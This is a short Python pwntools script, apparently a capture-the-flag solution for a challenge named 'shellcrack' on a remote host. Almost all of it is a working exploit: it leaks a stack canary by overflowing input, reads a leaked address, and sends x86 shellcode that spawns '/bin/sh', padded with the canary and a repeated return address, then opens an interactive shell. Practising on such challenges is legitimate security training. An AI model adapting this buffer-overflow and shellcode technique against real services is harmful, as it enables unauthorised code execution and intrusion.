from pwn import *

shellcode = """
    push 6845231;
    push 1852400175;
    mov ebx, esp;
    mov eax, 0xb;
    mov ecx, 0;
    mov edx, 0;
    int 0x80;
"""
# p = process('./shellcrack')
p = remote("plzpwn.me","5001")
q = p.recv()
p.sendline('A'*0xf)
q = p.recvuntil("!")[:-1]
can = u64(q[-9:-1])
ri= p.recvuntil('[')
add = int(p.recv(10),16)
payload = asm(shellcode)
p.recvuntil("].")
p.sendline(payload+'A'*(0x30-len(payload))+p64(can)+p32(add)*7)
p.interactive()
